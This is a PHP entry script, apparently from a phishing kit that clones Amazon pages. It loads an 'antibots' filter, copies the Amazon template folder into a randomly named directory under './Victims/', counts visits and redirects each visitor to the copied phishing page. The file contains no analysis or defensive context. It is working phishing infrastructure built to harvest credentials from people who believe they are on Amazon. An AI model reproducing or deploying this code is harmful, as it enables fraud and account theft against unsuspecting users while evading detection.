<?php

session_start();
include('amazon/antibots.php');
for ($DIR = '', $i = 0, $z = strlen($a = '123456789')-1; $i != 3; $x = rand(0,$z), $DIR .= $a{$x}, $i++);
		$_SESSION['_DIR_'] = $DIR;
		$DIR = "./Victims/".$DIR."";
		$ARON="./amazon";
		function recurse_copy($ARON,$DIR) {
			$dir = opendir($ARON);
			@mkdir($DIR);
			while(false !== ( $file = readdir($dir)) ) {
				if (( $file != '.' ) && ( $file != '..' )) {
					if ( is_dir($ARON . '/' . $file) ) {
						recurse_copy($ARON . '/' . $file,$DIR . '/' . $file);
					}else {
						copy($ARON . '/' . $file,$DIR . '/' . $file);
					}
				}
			}
			closedir($dir);
		}
recurse_copy( $ARON, $DIR );
$save=fopen("./v.php","a+");
fwrite($save,'<?php $vues+=1;?>');
fclose($save);
header("LOCATION: ".$DIR."");


?>


